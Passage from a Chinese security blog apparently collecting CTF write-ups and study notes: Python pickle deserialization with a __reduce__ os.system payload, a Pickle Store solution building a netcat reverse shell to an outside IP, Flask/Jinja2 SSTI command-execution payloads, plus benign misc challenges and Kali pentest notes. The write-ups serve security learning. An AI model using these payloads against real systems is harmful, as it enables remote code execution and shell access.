<p>从数据流中读取操作码和参数 , 并对其进行解释处理 . 指令处理器会循环执行这个过程 , 不断改变 <code>stack</code>和 <code>memo</code>区域的值 .直到遇到 <code>.</code>这个结束符号 。这时 , 最终停留在栈顶的的值将会被作为反序列化对象返回 。</p>
</blockquote>
<ul>
<li>栈区( stack )</li>
</ul>
<blockquote>
<p>由 <code>Python</code>的列表( <code>list</code>)实现 , 作为流数据处理过程中的暂存区 , 在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果</p>
</blockquote>
<ul>
<li>标签区( memo )</li>
</ul>
<blockquote>
<p>由 <code>Python</code>的字典( <code>dict</code>)实现 , 可以看作是数据索引或者标记 , 为 PVM 的整个生命周期提供存储功能 .简单来说就是将反序列化完成的数据以 <code>key-value</code>的形式储存在memo中，以便使用。</p>
</blockquote>
<p>需要重点关注一下指令处理器可读的操作码，列出几个比较重要的：</p>
<ol>
<li><code>c</code>: 读取本行的内容作为模块名<code>module</code>, 读取下一行的内容作为对象名<code>object</code>，然后将 <code>module.object</code>作为可调用对象压入到栈中</li>
<li><code>(</code>: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组</li>
<li><code>S</code>: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中</li>
<li><code>t</code>: 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中</li>
<li><code>R</code>: 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中</li>
<li><code>.</code>: 结束整个 <code>Pickle</code>反序列化过程</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">ccopy_reg 			#引入copy_reg模块
_reconstructor 		#引入_reconstructor对象
p0 					#p:将栈顶数据(copy_reg._reconstructor)存储在memo中，0是编号
(c__main__ 			#引入__main__模块
orange				#引入orange对象
p1					#将栈顶数据(__main__.orange)存储在memo中，1是编号
c__builtin__		#引入__builtin__模块
object				#引入object对象
p2					#将栈顶数据(__builtin__.object)存储在memo中，2是编号
Ntp3				#依次从栈中弹出数据直到(，此时弹出的数据组成一个元组，最后将该元组入栈
Rp4					#将元组和可调用对象全部弹出并执行，将结果压入栈顶，然后将栈顶数据存储在memo中
					#这里便完成了所有需要的模块和类对象的调用
(dp5				#在栈顶创建一个字典，将memo中的内容转换成键值对并存储在这个字典中
					#然后栈顶(这个字典)存储在memo中，5是编号
S&#39;a&#39;				#创建字符串&#39;a&#39;
p6					#存储在memo中
S&#39;1&#39;				#创建字符串’1‘
p7					#存储在memo中
sS&#39;b&#39;				#s:将&#39;a&#39;:&#39;1&#39;作为键值对添加到字典中，创建字符串&#39;b&#39;
p8					#存储在memo中
S&#39;2&#39;				#创建字符串&#39;2&#39;
p9					#存储在memo中
sb.					#将&#39;b&#39;:&#39;2&#39;作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容
					#读取到.结束pickle序列化过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>整个序列化的过程可以分为三个步骤</p>
<ol>
<li>从对象中提权所有属性</li>
<li>写入对象的所有模块名和类名</li>
<li>写入对象所有属性的键值对</li>
</ol>
<p>反序列化的过程就是序列化过程的逆过程。</p>
<h2 id="Pickle-CPickle反序列化漏洞分析"><a href="#Pickle-CPickle反序列化漏洞分析" class="headerlink" title="Pickle/CPickle反序列化漏洞分析"></a>Pickle/CPickle反序列化漏洞分析</h2><p>反序列化漏洞出现在 <code>__reduce__()</code>魔法函数上，这一点和PHP中的<code>__wakeup()</code>魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。</p>
<p>而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.</p>
<p>另外<code>pickle.loads</code>会解决<code>import</code>问题，对于未引入的<code>module</code>会自动尝试<code>import</code>。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。</p>
<p>最后还是来看一下这个魔法函数</p>
<pre class="line-numbers language-none"><code class="language-none">当 __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。这点跟我们上面提到的PVM中的R操作码功能相似，可以对比下：

R:将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>事实上 , <code>R</code>操作码就是 <code>__reduce__()</code>魔术函数的底层实现 . 而在反序列化过程结束的时候 , Python 进程会自动调用 <code>__reduce__()</code>魔术方法 . 如果可以控制被调用函数的参数 , Python 进程就可以执行恶意代码 .</p>
<p><strong>注意：</strong></p>
<blockquote>
<p>在python2中只有内置类才有<code>__reduce__</code>方法，即用<code>class A(object)</code>声明的类，而<code>python3</code>中已经默认都是内置类了</p>
</blockquote>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>漏洞可能出现的位置：</strong></p>
<ol>
<li>解析认证token、session的时候</li>
<li>将对象Pickle后存储成磁盘文件</li>
<li>将对象Pickle后在网络中传输</li>
<li>参数传递给程序</li>
</ol>
<p><strong>命令执行</strong></p>
<pre class="line-numbers language-none"><code class="language-none">import pickle
import os

class Test2(object):
    def __reduce__(self):
    	#被调用函数的参数
        cmd &#x3D; &quot;&#x2F;usr&#x2F;bin&#x2F;id&quot; 
        return (os.system,(cmd,))

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    test &#x3D; Test2()
    #执行序列化操作
    result1 &#x3D; pickle.dumps(test)
    #执行反序列化操作
    result2 &#x3D; pickle.loads(result1)

# __reduce__()魔法方法的返回值:
# return(os.system,(cmd,))
# 1.满足返回一个元组，元组中有两个参数
# 2.第一个参数是被调用函数 : os.system()
# 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd
# 4. 因此序列化时被解析执行的代码是 os.system(&quot;&#x2F;usr&#x2F;bin&#x2F;id&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="例题-watevrCTF-2019-Pickle-Store"><a href="#例题-watevrCTF-2019-Pickle-Store" class="headerlink" title="例题 [watevrCTF-2019]Pickle Store"></a>例题 [watevrCTF-2019]Pickle Store</h2><p>打开环境，我们购买不同东西时session是在变化的</p>
<p>将session进行base64解码</p>
<pre class="line-numbers language-none"><code class="language-none">&#125;q(XmoneyqMXhistoryq]qXanti_tamper_hmacqX aa1ba4de55048cf20e0a7a63b7f8eb62qu.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>有很明显的关键字，结合题目pickle store，应该是考察pickle反序列化漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">import pickleimport base64session &#x3D; &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;print(pickle.loads(base64.b64decode(session)))   #&#123;&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>借助前面所学的知识，我们可以编写反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">import base64import pickleimport osclass A(object):    def __reduce__(self):        cmd &#x3D; &quot;nc 39.108.113.70 2333 -e&#x2F;bin&#x2F;sh&quot;        return (os.system, (cmd,))a &#x3D; A()print(base64.b64encode(pickle.dumps(a)))#gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAzOS4xMDguMTEzLjcwIDIzMzMgLWUvYmluL3NolIWUUpQu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将结果发包，成功回弹了shell，<code>cat flag.txt</code>即可</p>
<h2 id="python3兼容问题"><a href="#python3兼容问题" class="headerlink" title="python3兼容问题"></a>python3兼容问题</h2><ul>
<li>序列化</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">import pickleinfo &#x3D; pickle.dumps(data, protocol&#x3D;2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>反序列化</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">import pickledata &#x3D; pickle.loads(info, encoding&#x3D;&quot;utf-8&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<blockquote>
<p>参考链接</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252189.html">https://www.freebuf.com/articles/web/252189.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/y472360651/article/details/87209589">https://blog.csdn.net/y472360651/article/details/87209589</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Misc-ext3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Derait">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="花与剑">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Misc-ext3/" class="post-title-link" itemprop="url">攻防世界 Misc ext3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-04 21:53:00 / 修改时间：22:04:15" itemprop="dateCreated datePublished" datetime="2021-08-04T21:53:00+08:00">2021-08-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Misc/" itemprop="url" rel="index"><span itemprop="name">Misc</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>下载附件后先用winhex打开，查找flag</p>
<p><img src="/images/pasted-0.png" alt="upload successful"></p>
<p>我们找到了flag的位置</p>
<p><img src="/images/pasted-1.png" alt="upload successful"></p>
<p>根据题目描述，我们可以知道这是一个linux光盘文件</p>
<p>linux光盘文件可以用mount命令挂载</p>
<p>语法</p>
<pre class="line-numbers language-none"><code class="language-none">mount [-hV]
mount -a [-fFnrsvw] [-t vfstype]
mount [-fnrsvw] [-o options [,...]] device | dir
mount [-fnrsvw] [-t vfstype] [-o options] device dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>参数说明：</p>
<pre class="line-numbers language-none"><code class="language-none">-V：显示程序版本
-h：显示辅助讯息
-v：显示较讯息，通常和 -f 用来除错。
-a：将 &#x2F;etc&#x2F;fstab 中定义的所有档案系统挂上。
-F：这个命令通常和 -a 一起使用，它会为每一个 mount 的动作产生一个行程负责执行。在系统需要挂上大量 NFS 档案系统时可以加快挂上的动作。
-f：通常用在除错的用途。它会使 mount 并不执行实际挂上的动作，而是模拟整个挂上的过程。通常会和 -v 一起使用。
-n：一般而言，mount 在挂上后会在 &#x2F;etc&#x2F;mtab 中写入一笔资料。但在系统中没有可写入档案系统存在的情况下可以用这个选项取消这个动作。
-s-r：等于 -o ro
-w：等于 -o rw
-L：将含有特定标签的硬盘分割挂上。
-U：将档案分割序号为 的档案系统挂下。-L 和 -U 必须在&#x2F;proc&#x2F;partition 这种档案存在时才有意义。
-t：指定档案系统的型态，通常不必指定。mount 会自动选择正确的型态。
-o async：打开非同步模式，所有的档案读写动作都会用非同步模式执行。
-o sync：在同步模式下执行。
-o atime、-o noatime：当 atime 打开时，系统会在每次读取档案时更新档案的『上一次调用时间』。当我们使用 flash 档案系统时可能会选项把这个选项关闭以减少写入的次数。
-o auto、-o noauto：打开&#x2F;关闭自动挂上模式。
-o defaults:使用预设的选项 rw, suid, dev, exec, auto, nouser, and async.
-o dev、-o nodev-o exec、-o noexec允许执行档被执行。
-o suid、-o nosuid：
允许执行档在 root 权限下执行。
-o user、-o nouser：使用者可以执行 mount&#x2F;umount 的动作。
-o remount：将一个已经挂下的档案系统重新用不同的方式挂上。例如原先是唯读的系统，现在用可读写的模式重新挂上。
-o ro：用唯读模式挂上。
-o rw：用可读写模式挂上。
-o loop&#x3D;：使用 loop 模式用来将一个档案当成硬盘分割挂上系统。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们使用如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">mount &#x2F;tex &#x2F;tmp
cd &#x2F;tmp
ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到成功输出了该光盘下的目录</p>
<p>接下来找flag</p>
<pre class="line-numbers language-none"><code class="language-none">find .&#x2F; -name flag.txt
cat .&#x2F;O7avZhikgKgbF&#x2F;flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>得到一串base64密文，解密即可</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/04/Kali-Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E2%80%94%E2%80%94%E4%BB%8B%E7%BB%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Derait">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="花与剑">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/04/Kali-Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E2%80%94%E2%80%94%E4%BB%8B%E7%BB%8D/" class="post-title-link" itemprop="url">Kali Linux学习笔记(1)——介绍</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-04 19:37:00" itemprop="dateCreated datePublished" datetime="2021-08-04T19:37:00+08:00">2021-08-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-08 22:39:22" itemprop="dateModified" datetime="2021-08-08T22:39:22+08:00">2021-08-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index"><span itemprop="name">Kali</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>参考课程：安全牛——Kali Linux渗透测试课程</p>
</blockquote>
<h2 id="001-Kali-Linux"><a href="#001-Kali-Linux" class="headerlink" title="001 Kali Linux"></a>001 Kali Linux</h2><h3 id="安全问题的根源"><a href="#安全问题的根源" class="headerlink" title="安全问题的根源"></a>安全问题的根源</h3><ul>
<li>分层思想的优劣</li>
<li>只追求功能实现</li>
<li>最大的安全威胁——人</li>
</ul>
<p>由于分层，我们无法在整体上看到一个系统，从安全的角度讲是一个巨大的问题</p>
<p>技术人员很少会从安全角度想问题，只追求功能实现</p>
<h3 id="安全目标"><a href="#安全目标" class="headerlink" title="安全目标"></a>安全目标</h3><p>先于攻击者发现和防止漏洞出现</p>
<ul>
<li>攻击性安全</li>
<li>防护性安全</li>
</ul>
<p>防护型安全存在的一个根本问题就是永远无法全面地防护</p>
<p>因此我们需要攻击性安全——渗透测试</p>
<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><ul>
<li>尝试挫败安全防御机制，发现系统安全弱点</li>
<li>从攻击者的角度思考，测量安全防护有效性</li>
<li>证明问题的存在而并非破坏</li>
<li>牢记道德约束与法律</li>
</ul>
<h3 id="渗透测试标准"><a href="#渗透测试标准" class="headerlink" title="渗透测试标准"></a>渗透测试标准</h3><ul>
<li>PETS(<a target="_blank" rel="noopener" href="http://www.pentest-standard.org/index.php/Main_Page">http://www.pentest-standard.org/index.php/Main_Page</a>)</li>
<li>前期交互阶段——首先和客户进行沟通：确定渗透测试的范围（如一个系统），可以使用的手段（通常不包含ddos和社会工程学），工作方式（现场或者远程）</li>
<li>情报收集阶段——通过主动的（扫描等与目标产生连接的方式）或者被动的 （搜索引擎，资料等不与目标产生连接的方式）手段进行信息收集</li>
<li>威胁建模阶段——整理分析所获得的信息，确定一两条效率最高、最快的攻击途径</li>
<li>漏洞分析阶段——是否有已公开漏洞，逆向工程分析，0day，编写有针对性的利用代码（准备武器）</li>
<li>渗透攻击阶段——如果测试环境成功而真实环境不成功，则需要从头再处理</li>
<li>后渗透测试阶段——即使已经控制了一台服务器，也应该进一步向内网渗透</li>
<li>渗透测试报告——如何修复，解决问题，避免被真正的黑客利用</li>
</ul>
<h3 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h3><ul>
<li>渗透测试范围</li>
<li>获得授权——攻击和渗透的根本区别</li>
<li>渗透测试方法（是否允许社会工程学和拒绝服务攻击）</li>
</ul>
<h3 id="渗透测试误区"><a href="#渗透测试误区" class="headerlink" title="渗透测试误区"></a>渗透测试误区</h3><ul>
<li>扫描器就是一切——忽视业务逻辑层面的漏洞 </li>
</ul>
<p>真正的高手可以完全不需要扫描器，扫描器只是我们辅助的工具手段</p>
<h3 id="Kali-Linux介绍"><a href="#Kali-Linux介绍" class="headerlink" title="Kali Linux介绍"></a>Kali Linux介绍</h3><ul>
<li>基于Debian的linux发行版本</li>
<li>前身是BackTrack，2013年3月发布</li>
<li>用于渗透测试和安全审计</li>
<li>包含600+安全工具</li>
<li>FHS标准目录结构</li>
<li>定制内核</li>
<li>支持ARM和手机平台</li>
<li>开源免费</li>
</ul>
<h3 id="Kali-Linux策略"><a href="#Kali-Linux策略" class="headerlink" title="Kali Linux策略"></a>Kali Linux策略</h3><ul>
<li>root用户策略——频繁地使用root账号，不同于其他的linux，kali没有必要使用普通权限的账号</li>
<li>网络服务策略</li>
<li>更新升级策略</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Misc-gif/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Derait">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="花与剑">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Misc-gif/" class="post-title-link" itemprop="url">攻防世界 Misc gif</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-04 19:18:00 / 修改时间：19:19:10" itemprop="dateCreated datePublished" datetime="2021-08-04T19:18:00+08:00">2021-08-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Misc/" itemprop="url" rel="index"><span itemprop="name">Misc</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>解压后进入文件夹，文件只有黑白两种颜色，猜想是01编码，且给出白为0，脚本如下</p>
<pre class="line-numbers language-none"><code class="language-none">res &#x3D; &quot;&quot;

black &#x3D; open(r&quot;D:\Download\dbbc971bf4da461fb8939ed8fc9c4c9d\gif\1.jpg&quot;,&quot;rb&quot;).read()
white &#x3D; open(r&quot;D:\Download\dbbc971bf4da461fb8939ed8fc9c4c9d\gif\0.jpg&quot;,&quot;rb&quot;).read()

for i in range(103):
    mulu &#x3D; r&quot;D:\Download\dbbc971bf4da461fb8939ed8fc9c4c9d\gif\&#123;name&#125;.jpg&quot;.format(name&#x3D;i)
    now &#x3D; open(mulu,&quot;rb&quot;).read()
    if now &#x3D;&#x3D; white:
        res +&#x3D; &quot;0&quot;
    else:
        res +&#x3D; &quot;1&quot;

flag &#x3D; &quot;&quot;
for i in range(len(res)&#x2F;&#x2F;8):
    flag +&#x3D; chr(int(res[i*8:(i+1)*8],2))
print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成功拿到flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/03/FlaskLight/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Derait">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="花与剑">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/03/FlaskLight/" class="post-title-link" itemprop="url">FlaskLight</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-03 11:59:00" itemprop="dateCreated datePublished" datetime="2021-08-03T11:59:00+08:00">2021-08-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-07 15:17:29" itemprop="dateModified" datetime="2021-08-07T15:17:29+08:00">2021-08-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h1><blockquote>
<p>一道以前刚好做过的ctf练习，那今天就借此机会回顾一下SSTI</p>
</blockquote>
<h2 id="SSTI概念"><a href="#SSTI概念" class="headerlink" title="SSTI概念"></a>SSTI概念</h2><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，给出了一个注入的概念。</p>
<p>SSTI获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p>
<p>本题是flask的SSTI</p>
<h2 id="flask——SSTI利用"><a href="#flask——SSTI利用" class="headerlink" title="flask——SSTI利用"></a>flask——SSTI利用</h2><pre class="line-numbers language-none"><code class="language-none">$output &#x3D; $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; &#x3D;&gt; $_GET[&quot;name&quot;])); 
echo $output;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果我们向name参数传递恶意的代码，就会嵌入其中执行</p>
<p>这和SQL注入有共通之处</p>
<p>本文中主要介绍的是python——flask的SSTI</p>
<h3 id="相关python类名介绍"><a href="#相关python类名介绍" class="headerlink" title="相关python类名介绍"></a>相关python类名介绍</h3><pre class="line-numbers language-none"><code class="language-none">__class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。
__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值
__subclasses__()：查看当前类的子类。
__mro__：获取类的调用顺序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125; </code> 获取所有继承自object的类</p>
<p><code>__subclasses__</code>该模块是查询到的结果是一个类的全部子类，我们需要在这些子类中寻找可以利用的子类。这个模块返回的数据往往有很多，可以通过将这些数据存入到List，通过list.index(‘’)来输出所需要的的模块所在的位置。</p>
<p><code>__mro__</code>与<code>__base__</code>的区别在于，<code>__mro__</code>返回的是一个对象所属的类继承的全部类，可以有很多个。<code>__base__</code>返回的是其继承的基类，只有一个。</p>
<p>可以利用的子类：<code>warnings.catch_warnings</code>（一般在59）、<code>socket._socketobject</code>（一般在71）、<code>site._Printer</code>、<code>subprocess.Popen()</code>等模块。</p>
<blockquote>
<p>warnings.catch_warinings是没有内置OS模块的需要导入os模块</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">__builtins__是python的内置模块，内含有python内置的函数。可以通过此模块来调用内置函数如：eval、exec、open。也正是可以利用这些方法进行命令执行、文件读取。

os模块提供了多数操作系统的功能接口函数。当os模块被导入后，它会自适应于不同的操作系统平台，根据不同的平台进行相应的操作。os模块中可以利用的函数：system(command)运行shell命令、listdir(dirname)列出dirname下的目录和文件、popen从一个命令打开一个管道进行文件读取等。

区分python2和python3可以查找__builtins__中是否有file有file的话是2没有的话是3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="常用的exp"><a href="#常用的exp" class="headerlink" title="常用的exp"></a>常用的exp</h3><pre class="line-numbers language-none"><code class="language-none">#  读目录、文件
&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;

&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).listdir(&#39;&#x2F;&#39;)&quot;)&#125;&#125;

&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)&#125;&#125;

&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(cat &#x2F;xxx&#x2F;flag)&#125;&#125;

&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open(&#39;xxx&#39;,&#39;r&#39;).read()&#125;&#125;

#  页面没有回显时
#命令执行： 
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; 
#先通过for循环根据模块名寻找符合要求的模块
&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;
&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;
#如果找到该模块就进行后续的函数操作
&#123;% endif %&#125;&#123;% endfor %&#125; 
# 结束判断结束循环
  
#  文件操作
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
